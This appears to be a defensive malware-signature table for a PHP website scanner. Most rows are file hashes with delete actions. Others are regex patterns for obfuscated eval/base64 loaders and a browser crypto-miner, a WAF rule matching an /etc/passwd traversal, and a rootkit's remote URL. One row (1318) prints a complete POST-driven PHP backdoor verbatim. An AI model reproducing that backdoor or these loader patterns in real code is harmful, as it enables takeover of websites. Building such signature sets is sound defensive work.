959,FROM_FA_23375,4aafe7043aa91ba0896319b1fe1985bc,FILE,MALWARE,'2020-11-25 17:26:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
961,malware.020322.0935,0d59da57ef4ce50aefcd103340f7389c,FILE,MALWARE,'2020-11-25 17:34:34','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
963,FROM_FA_23416,dddaa75d82028a6be98ebe6942e0c205,FILE,MALWARE,'2020-11-25 17:35:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
965,FROM_FA_23418,cee49b924a7af25200f0302420fde3b7,FILE,MALWARE,'2020-11-25 17:36:02','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
967,FROM_FA_23420,f6518abacbcd067fe6cdd0c0197e5066,FILE,MALWARE,'2020-11-25 17:36:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
969,FROM_FA_23422,0799bc13ef532b0a29682316d3a7ba89,FILE,MALWARE,'2020-11-25 17:36:17','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
971,FROM_FA_23424,6423193cc34a1c43e7bf959a56b3fd6e,FILE,MALWARE,'2020-11-25 17:36:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
973,FROM_FA_23426,39d9a27a40d56b2792d36bc923f9f29e,FILE,MALWARE,'2020-11-25 17:36:29','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
975,FROM_FA_23428,b0af35ddc9cf097f8e117ef128b914f2,FILE,MALWARE,'2020-11-25 17:36:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
977,malware.Oo0.240322.0947.23433,'#\@set_time_limit\(3600\);[\n\r]\@ignore_user_abort\(1\);[\n\r]\$xmlname\s=\s''mapss273_275_277_279_new[\s\S]{1,33200}CwkT08wMDAwKSkpKTs="\)\);#',CODE_PHP,MALWARE,'2020-11-25 17:38:15','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
979,'U FROM_FA_23436',930f8ea4c18d4ec5ecc72b09d339953a,FILE,MALWARE,'2020-11-25 17:41:33','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
981,'U FROM_FA_23391',bcabf30e3aefbcae2e7bd831303c3da6,FILE,MALWARE,'2020-11-25 17:57:44','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
983,'U FROM_FA_23434',e949b2a5dadd792ebdfd906f77f70c84,FILE,MALWARE,'2020-11-25 17:58:00','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
985,FROM_FA_23563,522f51f71a8d8acd2067b9ba24e8eb3d,FILE,MALWARE,'2020-11-25 18:00:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
987,'U FROM_FA_23431',2dab7f2cdfb409629c7bd8dc09c5772d,FILE,MALWARE,'2020-11-25 18:07:08','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1001,FROM_FA_23580,c5efbd981cf89de69051c7ee8773e70a,FILE,MALWARE,'2020-11-30 09:11:25','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1003,FROM_FA_23581,b84d710ce062a4ea6a9133d22dc42004,FILE,MALWARE,'2020-11-30 09:11:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1015,FROM_FA_23846,7bfd237db9f7d58661cb9d00941d5cd1,FILE,MALWARE,'2020-12-17 09:15:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1017,FROM_FA_23848,dee9d34bc69a7e295b1344a7777522a1,FILE,MALWARE,'2020-12-17 09:15:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1019,FROM_FA_23862,8fcd25071ea0aba11e8cdc6c3fd72157,FILE,MALWARE,'2020-12-18 15:00:01','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1021,FROM_FA_23889_2020-12-22_12:2:55,'if (file_exists(dirname(__FILE__) . ''/wp-vcd.php'')) include_once(dirname(__FILE__) . ''/wp-vcd.php'');',CODE_PHP,MALWARE,'2020-12-22 12:02:59','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1023,FROM_FA_23896,d6647775d3c521cc1fb59d20dd211850,FILE,MALWARE,'2020-12-22 14:13:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1025,malware.eval.210322.1534.23923,'#eval\(base64_decode\(''JGZpbGUgPS.{1,2300}taW4vJyk7''\)\);#',CODE_PHP,MALWARE,'2020-12-25 08:56:50','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1027,FROM_FA_23928,3a19b1d0a7bfba4d63fa3dbdbef06eb7,FILE,MALWARE,'2020-12-28 13:01:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1029,FROM_FA_23929,802f543e3f199ae34503d22d8321d590,FILE,MALWARE,'2020-12-28 13:01:32','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1033,FROM_FA_23933,03684836d61a019bc94eec52db235f08,FILE,MALWARE,'2020-12-28 13:02:03','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1039,FROM_FA_23939,29ae0aee269762b5a06669d50789473d,FILE,MALWARE,'2020-12-28 13:03:04','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1045,FROM_FA_23953,7234d52a48b2f457aa252d7a6948ee7e,FILE,MALWARE,'2020-12-31 10:46:15','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1047,Miner.url.hostingcloud.racing/ab20.js,'/var\s*_client\s*=\snew\sClient\.Anonymous\(''[\da-z]+'',\s*{throttle:\s*0\.55,\s*c:\s*''w'',\s*ads:\s*0}\);\s*_client\.setNumThreads\(15\);_client\.setAutoThreadsEnabled\(1\);_client\.start\(Client\.FORCE_MULTI_TAB\);/',CODE_JS,MALWARE,'2021-01-18 20:22:42',
1049,malware.rootkit.linuxdata,'define("GETDOM","http://www.linuxdata-3.top/jp15061qi-1/");',CODE_PHP,MALWARE,'2021-01-21 10:01:36',
1051,malware.unknown.1,'/GLOBALS;\$\{"(\\[a-z\d]{3}|G|L|O|B|A|L|S)+"\}\[''/',CODE_PHP,MALWARE,'2021-01-25 14:34:24',
1053,malware.unknown.2,'/\$[a-zA-Z0-9]{1,10}=gzinflate\(base64_decode\(\$lLLSQ\)\);/',CODE_PHP,MALWARE,'2021-01-25 15:02:12','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1055,malware.unknown.3,'/<\?php\s+\$[O0]{1,10}=base64_decode\("[a-zA-Z0-9=+]+"\).*?eval\(\$[O0]{1,10}\(\"[a-zA-Z0-9+=]+"\)\);\s+\?>/',CODE_PHP,MALWARE,'2021-01-25 15:33:02','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1057,malware.unknown.4,'/eval\(base64_decode\("[a-zA-Z0-9=]*?"\)\);/',CODE_PHP,MALWARE,'2021-01-26 08:23:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1059,exploit.1,'\.php\?file_link=\/etc\/passwd',WAF_RULE,EXPLOIT,'2021-01-26 15:17:34',
1061,malware.unknown.5,'/base64_decode\(\$_POST\[''[a-zA-Z0-9]*?''\]\);\s*\@eval/',CODE_PHP,MALWARE,'2021-01-26 20:43:33',
1063,malware.uploader.2,'/echo\s*''Uploader By Psyco!'';/',CODE_PHP,MALWARE,'2021-01-26 20:54:42','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1065,FROM_FA_25947,d8ff66d771c7c7192c5f2e1ae320a961,FILE,MALWARE,'2021-04-05 11:59:55','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1067,FROM_FA_25949,daf1e3e1870ed729a7376ff5958a78f9,FILE,MALWARE,'2021-04-05 12:00:00','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1071,malware.210322.1516.26007,'#\$nmgmpptf="rbrrrrrarrrrsrrrrre.{1,23000}user_error\(\$usdrvtwgzx,E_USER_ERROR\);#',CODE_PHP,MALWARE,'2021-04-08 13:40:43','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1072,FROM_FA_26349,a79c038830cfd115d1d2872f5e590ecf,FILE,MALWARE,'2021-04-14 21:19:57','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1085,'u1 FROM_FA_26742',afeafc31a97d73eb36dcce20b5df01d1,FILE,MALWARE,'2021-04-29 12:30:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1087,'u1 FROM_FA_26740',9e79bea4164a02ba0c13511ade2cbd57,FILE,MALWARE,'2021-04-29 12:30:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1089,'U FROM_FA_26738',4694e40a8149a8657ace05402a2a953b,FILE,MALWARE,'2021-04-29 12:31:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1091,'U FROM_FA_26734',e5fdbae9e0eb167b58a993a878b06cc9,FILE,MALWARE,'2021-04-29 12:31:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1093,'U FROM_FA_26728',65e1929b1afc5d063936a51ebd008032,FILE,MALWARE,'2021-04-29 12:31:51','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1095,'U FROM_FA_26727',7179b053e5af944b81dace20021c3f98,FILE,MALWARE,'2021-04-29 12:31:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1097,'U FROM_FA_26723',970070b6cd2e175327bd3aa930549daa,FILE,MALWARE,'2021-04-29 12:33:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1099,malware.Oo0.210322.1340.26721,'#\@set_time_limit\(3600\);[\n\r]\@ignore_user_abort\(1\);[\n\r]\$xmlname\s=\s''mapssK1_K5_K9_K13_new[\s\S]{1,31900}PME8wMDAsMCwkT08wMDAwKSkpKTs="\)\);#',CODE_PHP,MALWARE,'2021-04-29 12:33:31','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1101,FROM_FA_26864,ebd0b9b0f8aa36e5186b13ed93990b21,FILE,MALWARE,'2021-04-29 13:00:47','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1103,FROM_FA_26868,e71575c0d784fdb21ea11a91a60689a9,FILE,MALWARE,'2021-04-29 13:01:15','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1105,FROM_FA_26870,ac9469e665c8d6d5df9dda6cd4ac2d76,FILE,MALWARE,'2021-04-29 13:01:16','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1107,FROM_FA_26874,380978970739ca4e4351384ea5a039be,FILE,MALWARE,'2021-04-29 13:01:21','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1109,FROM_FA_26878,8dfa852498e80503e3e8b0c5c486ae5b,FILE,MALWARE,'2021-04-29 13:01:35','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1111,FROM_FA_26884,1f01e5c3fb65fc7ce8af8a86a9a1870e,FILE,MALWARE,'2021-04-29 13:01:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1113,FROM_FA_26888,680135758d4d7f4c7d8c2677e248c58a,FILE,MALWARE,'2021-04-29 13:02:05','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1117,FROM_FA_26894,677233a59058b4d4dd04fff713db588e,FILE,MALWARE,'2021-04-29 13:02:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1119,FROM_FA_26892,a3b2ff195a93c7d0d75d1d9f0a87a130,FILE,MALWARE,'2021-04-29 13:02:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1121,FROM_FA_26896,f72aac88a42d22dec4dcbb607bdcc781,FILE,MALWARE,'2021-04-29 13:02:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1123,FROM_FA_26898,2d85eda3775029357a84a6656c4f035e,FILE,MALWARE,'2021-04-29 13:02:31','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1125,FROM_FA_26979,95fc7104f370a92f32327871c75682ab,FILE,MALWARE,'2021-04-29 13:08:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1127,FROM_FA_26981,cebb7e4f1f8d1ba111fd4e24bca263e1,FILE,MALWARE,'2021-04-29 13:08:15','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1129,FROM_FA_26540,08efe1b82e09428056086ec3ae69b584,FILE,MALWARE,'2021-04-29 13:10:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1131,malware.020322.0937,f28a0cd60624cf5498e157921e63f371,FILE,MALWARE,'2021-04-29 13:37:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1133,malware.020322.0936,f28a0cd60624cf5498e157921e63f371,FILE,MALWARE,'2021-04-29 13:37:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1137,FROM_FA_27207,558917c76b41c92a718555f7eb3e0090,FILE,MALWARE,'2021-05-07 08:58:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1139,FROM_FA_27209,7dacc601b7e6dff4b8019a70e088a613,FILE,MALWARE,'2021-05-07 08:59:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1141,FROM_FA_27211,5eb9aae61ad281783666e47c3b83d7d7,FILE,MALWARE,'2021-05-07 08:59:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1143,FROM_FA_27213,fd97e0fe5963fcfeca95266a7569e9c3,FILE,MALWARE,'2021-05-07 09:00:07','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1145,FROM_FA_27215,9b060f4eb61aea285b87dceb306dd025,FILE,MALWARE,'2021-05-07 09:00:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1147,FROM_FA_27217,a06c249c9496b04a73a9b5584c417abd,FILE,MALWARE,'2021-05-07 09:00:40','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1149,FROM_FA_27219,75ac6e4878762f341c9c3231b7f08bd7,FILE,MALWARE,'2021-05-07 09:00:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1151,FROM_FA_27221,1e2502c12118cc5dc5a0f007306e06a9,FILE,MALWARE,'2021-05-07 09:01:20','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1153,FROM_FA_27223,b83001e940ff06a4a479b3d9fbe29140,FILE,MALWARE,'2021-05-07 09:01:29','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1155,FROM_FA_27225,9084c1888be43c160f94e42ec68cd550,FILE,MALWARE,'2021-05-07 09:01:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1157,FROM_FA_27227,c661063f0771ca46f6c8856d61e49bfa,FILE,MALWARE,'2021-05-07 09:01:49','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1159,FROM_FA_27229,6ae2d4858e688e197d9a85a1b5c214b7,FILE,MALWARE,'2021-05-07 09:01:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1161,FROM_FA_27231,034b44fc835ec6ad7e68f5d2ef77829e,FILE,MALWARE,'2021-05-07 09:02:16','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1163,FROM_FA_27233,43f26f345a90b0ba532ed31ff6c9befd,FILE,MALWARE,'2021-05-07 09:02:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1165,FROM_FA_27235,9c8971cf038adbd5dac99d108b99cc06,FILE,MALWARE,'2021-05-07 09:02:32','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1167,FROM_FA_27237,d9cf8822452511280425c6152022aaf1,FILE,MALWARE,'2021-05-07 09:02:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1169,FROM_FA_27239,defd8275dceabfbe6b5daebaf575d8d3,FILE,MALWARE,'2021-05-07 09:02:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1171,FROM_FA_27241,19662bb29c0a0387c7221c2bedbd8d00,FILE,MALWARE,'2021-05-07 09:03:01','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1173,FROM_FA_27242,22088fdad6a7faa841c0bfb8449de38c,FILE,MALWARE,'2021-05-07 09:03:11','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1175,FROM_FA_27280,7c626075188c0e046cbb79dacff61509,FILE,MALWARE,'2021-05-12 12:14:16','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1177,FROM_FA_27367,e1e656e7265d76bbd76bf0b4aa53604b,FILE,MALWARE,'2021-05-14 16:47:17','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1179,malware.020322.0938,eee3821596e9d5ec65be5ca5cc1931a4,FILE,MALWARE,'2021-05-31 16:41:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1183,FROM_FA_27459,62f88eb5f4ab8c04e7018ea51040422e,FILE,MALWARE,'2021-05-31 16:46:02','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1195,FROM_FA_27533,46c0e96b5c4c87f4f1420fecb43d043c,FILE,MALWARE,'2021-05-31 16:57:54','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1197,malware.020322.0939,f28b48f734760224cd65bc334a7debb5,FILE,MALWARE,'2021-05-31 17:04:44','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1199,FROM_FA_27563,7e12951910ebd6c867d9a18a803e4448,FILE,MALWARE,'2021-05-31 17:04:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1203,FROM_FA_27834,8d82c81fa35ba8949d408e101416d7f4,FILE,MALWARE,'2021-06-07 10:01:07','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1205,malware.200322.0853.27834,8d82c81fa35ba8949d408e101416d7f4,FILE,MALWARE,'2021-06-07 10:01:15','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1207,malware.200322.0846.27758,'#\/\*5938291\*\/ error_reporting\(0\); @ini_set\(.{1,3000}07CiB9CiB9''\)\); @ini_restore\(''error_log''\); @ini_restore\(''display_errors''\); \/\*5938291\*\/#',CODE_PHP,MALWARE,'2021-06-07 10:09:00','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1209,FROM_FA_27989,a57dfdb7ab369ead0d51624aece2bdee,FILE,MALWARE,'2021-06-15 14:57:12','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1211,malware.210322.1245.27994,a59a41a506ba88d34f071c39c81ccd86,FILE,MALWARE,'2021-06-15 15:01:13','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1213,FROM_FA_28081,f3ac4b400591eecd6100b333bbe19d6b,FILE,MALWARE,'2021-06-15 15:18:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1215,FROM_FA_28085,b13fcd1a83e813f007843a4ac43252ec,FILE,MALWARE,'2021-06-15 15:18:41','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1217,FROM_FA_28087,648f6812cfcc0929fcf83f2dd41c398a,FILE,MALWARE,'2021-06-15 15:18:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1219,FROM_FA_28089,83cc073b6b86491979d869bc94f72764,FILE,MALWARE,'2021-06-15 15:18:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1221,FROM_FA_28091,136d117f667af92f59b464e40af2b65e,FILE,MALWARE,'2021-06-15 15:19:00','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1223,FROM_FA_28093,5895ab8351694a92b3d7891a04912f5c,FILE,MALWARE,'2021-06-15 15:19:08','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1225,FROM_FA_28095,17cfcad081e4b392521919c7b3b42d10,FILE,MALWARE,'2021-06-15 15:19:13','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1227,FROM_FA_28097,1045310c04f4b13d7f5c6337d54550b1,FILE,MALWARE,'2021-06-15 15:19:18','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1236,malware.unkown,6fbcbc513ca79cbe76ee450ea2cda992,FILE,MALWARE,'2021-06-24 15:15:23','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1263,'Backdoor. FROM_FA_27802',69e261a68f411cc82352ab45ddb09139,FILE,MALWARE,'2021-07-02 14:37:04','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1265,malware.190322.1426.29269,'#\/\*y6_4l0y5q9k_tv1s7tj\*[\s\S]{1,1318}\/\*lxp_08r7mq_d_lj84l0yq\*\/#',CODE_PHP,MALWARE,'2021-07-07 10:51:38','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1267,malware.020322.0940,75403caa9a1734faa9062c6b1584c59c,FILE,MALWARE,'2021-07-08 10:34:09','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1269,FROM_FA_29293,e9496064fbbc703fd14d105169c82acb,FILE,MALWARE,'2021-07-08 10:36:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1271,FROM_FA_29335,a0ca67ca239c008474d8b94c5b93803e,FILE,MALWARE,'2021-07-12 10:15:29','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1273,FROM_FA_29337,1727d63a7ed78c9fa4a5ef43e3871553,FILE,MALWARE,'2021-07-12 10:15:51','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1275,FROM_FA_29455,2e2c05c636da72c870f496b4daf42529,FILE,MALWARE,'2021-07-12 10:50:31','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1279,malware.200322.0835.29839,71e41577fc1afb2ae2301b8900ddffce,FILE,MALWARE,'2021-07-12 10:52:17','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1281,FROM_FA_30074,b960b3d23ff0b7d33c76daa08fc799a3,FILE,MALWARE,'2021-07-13 10:26:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1285,FROM_FA_30078,192ed82624804a2aca1f8851767dfdb9,FILE,MALWARE,'2021-07-13 10:27:15','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1287,FROM_FA_30082,a557a18390e592e3ca8d45abfeb7fd95,FILE,MALWARE,'2021-07-13 10:27:34','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1289,FROM_FA_30084,5bb05ed0f1d9b45a5a11c57afdfb8268,FILE,MALWARE,'2021-07-13 10:27:44','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1291,FROM_FA_30086,05fa34c079e8ed802b64c3e67996efe7,FILE,MALWARE,'2021-07-13 10:27:51','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1293,FROM_FA_30088,e5b487a33887e26c69148c8041929253,FILE,MALWARE,'2021-07-13 10:28:01','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1295,FROM_FA_30090,aea874a245a8f58eaf1b5bd51807eaea,FILE,MALWARE,'2021-07-13 10:28:16','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1297,FROM_FA_30092,7f2c79c3b1a67262159e982e1d59ccd8,FILE,MALWARE,'2021-07-13 10:28:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1301,malware.020322.0931,be4e26662995b405a86d7f673e768edd,FILE,MALWARE,'2021-09-06 17:56:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1303,malware.020322.0930,d46f7012d9ed24d2b27a1fe9b315ca44,FILE,MALWARE,'2021-09-06 17:59:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1307,malware.230322.1606.30535,893f92792d20cd85fab11dfe037414bc,FILE,MALWARE,'2021-09-08 16:52:43','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1311,malware.020322.0929,6a6dd441b41fb9eed24ae94fc749fcbe,FILE,MALWARE,'2021-09-08 16:53:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1312,malware.020322.0928,234a3c43a18a0ecf0632893ee45cd289,FILE,MALWARE,'2021-09-17 15:38:05','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1318,malware.250322.1202.34629,'error_reporting(0);ini_set(''display_errors'', 0); if(isset($_POST[''m'']) && md5($_POST[''m'']) == "8b83a84918c63d1e9b9ab82e07e20539" ) {$a = base64_decode($_POST[''a'']);file_put_contents(''_a'',''<?php ''.$a);$a=''_a'';if(file_exists($a)){include($a);unlink($a);}}',CODE_PHP,MALWARE,'2021-09-17 17:56:14','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1320,malware.020322.0927,2b5781966def5728b55ffdcff7eb2283,FILE,MALWARE,'2021-09-17 17:57:17','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1322,malware.230322.1105.34553,d20adef1772c34c8dafc0b948f45ea22,FILE,MALWARE,'2021-09-17 17:58:56','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1323,malware.020322.0926,39d711aee053f891f6a85fabf78d39fb,FILE,MALWARE,'2021-09-24 15:29:38','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1325,malware.020322.0925,e93eb2611517312c52a4e4c2c5611ea2,FILE,MALWARE,'2021-09-24 15:33:07','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1327,malware.eval.230322.1104.35277,'#eval\(gzinflate\(base64_decode\(''DdBHkqNIAE.{1,2000}vn\+\/v73n\/8B''\)\)\);#',CODE_PHP,MALWARE,'2021-10-01 10:23:47','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1329,malware.eval.230322.1100.35279,'#eval\(gzinflate\(base64_decode\(''DdJHrqtIAA.{1,1300}\/v77z\/\/Aw==''\)\)\); #',CODE_PHP,MALWARE,'2021-10-01 10:24:04','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1331,malware.eval.230322.1057.35281,'#eval\(gzinflate\(base64_decode\(''DdFHjqtYAA.{1,1100}Xn9\/f333\/\+Bw==''\)\)\);#',CODE_PHP,MALWARE,'2021-10-01 10:24:22','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
